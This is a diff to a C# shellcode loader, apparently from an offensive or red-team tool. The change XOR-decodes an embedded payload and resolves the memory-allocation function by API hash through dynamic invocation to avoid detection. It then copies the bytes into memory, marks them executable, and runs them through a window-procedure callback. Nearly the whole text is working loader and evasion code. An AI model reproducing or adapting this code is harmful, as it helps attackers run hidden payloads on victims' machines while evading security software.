@@ -11,36 +11,45 @@ namespace CallWinProCallBacK
 {
     class Execute
     {
-        public static byte[] buf;
+        public static byte[] mybytearr;
         public static void exec()
         {
             if (GetCode.UseRaw == true)
             {
-               buf = GetEmbeddedBin("dotnetlib");
+                mybytearr = GetEmbeddedBin(GetCode.ResName);
+                for (int i = 0; i < mybytearr.Length; i++)
+                {
+                    mybytearr[i] ^= 0x4e;
+                    mybytearr[i] ^= 0x2e;
+
+                }
+
             }
             else
             {
                 //3d4f0f8e
                 Stack<byte> recvStack = GetCode.CodeStack();
-                buf = new byte[recvStack.Count];
+                mybytearr = new byte[recvStack.Count];
                 int payloadLen = recvStack.Count;
                 for (int i = 0; i <= payloadLen; i++)
                 {
                     try
                     {
-                        buf[i] = recvStack.Pop();
+                        mybytearr[i] = recvStack.Pop();
                     }
                     catch { break; }
 
                 }
             }
+
             IntPtr GetNeedDLL = Dinvoke.GetModuleAddress("kernel32.dll");
             IntPtr FuncAddr = Dinvoke.GetExpAddressByHASH(GetNeedDLL, @"3d4f0f8e");
             FuckAlloc FuckAlloc = (FuckAlloc)Marshal.GetDelegateForFunctionPointer(FuncAddr, typeof(FuckAlloc));
-            IntPtr addr = FuckAlloc(0, buf.Length, 0x1000, 0x04);
-            Marshal.Copy(buf, 0, addr, buf.Length);
+            IntPtr addr = FuckAlloc(0, mybytearr.Length, 0x1000, 0x04);
+
+            Marshal.Copy(mybytearr, 0, addr, mybytearr.Length);
             uint word;
-            MYVIRTULProtect(addr, (UIntPtr)buf.Length, (uint)AllocationProtect.PAGE_EXECUTE, out word);
+            MYVIRTULProtect(addr, (UIntPtr)mybytearr.Length, (uint)AllocationProtect.PAGE_EXECUTE, out word);
             FuckWindowProc(addr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
 
 
